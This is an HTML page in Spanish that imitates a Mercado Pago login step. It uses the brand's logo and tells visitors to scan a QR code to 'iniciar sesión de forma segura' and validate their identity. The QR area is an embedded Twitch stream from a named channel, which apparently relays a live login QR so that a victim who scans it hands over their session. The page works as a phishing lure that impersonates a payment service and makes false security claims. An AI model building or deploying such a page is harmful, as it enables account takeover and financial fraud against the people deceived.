<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Streaming Seguro</title>
  <style>
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
    }

    .header {
      background-color: #ffe600;
      padding: 10px 20px;
      display: flex;
      align-items: center;
    }

    .logo {
      height: 30px;
    }

    .container {
      display: flex;
      justify-content: space-between;
      padding: 60px 80px;
    }

    .left {
      width: 50%;
    }

    .left h2 {
      font-size: 28px;
      margin-bottom: 10px;
    }

    .left p {
      color: #666;
      max-width: 400px;
    }

    .right {
      width: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .frame-box {
      background-color: transparent;
      padding: 0;
      border: none;
    }

    .frame-inner {
      width: 300px;
      height: 300px;
      border: none;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    iframe {
      width: 280px;
      height: 160px;
      border: none;
      background: transparent;
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="logo.jpg" alt="Mercado Pago" class="logo" />
  </div>

  <div class="container">
    <div class="left">
      <p style="font-size: 12px; color: #666; text-transform: uppercase;">Inicio de sesión</p>
      <h2>Escaneá el QR para iniciar sesión de forma segura</h2>
      <p>Este paso es necesario para validar tu identidad y mantener tu cuenta siempre protegida.</p>
    </div>

    <div class="right">
      <div class="frame-box">
        <div class="frame-inner">
          <iframe
            src="https://player.twitch.tv/?channel=ecarballogais&parent=ecarballogais.es"
            allowfullscreen
            scrolling="no"
            style="background: transparent;">
          </iframe>
        </div>
      </div>
    </div>
  </div>

</body>
</html>
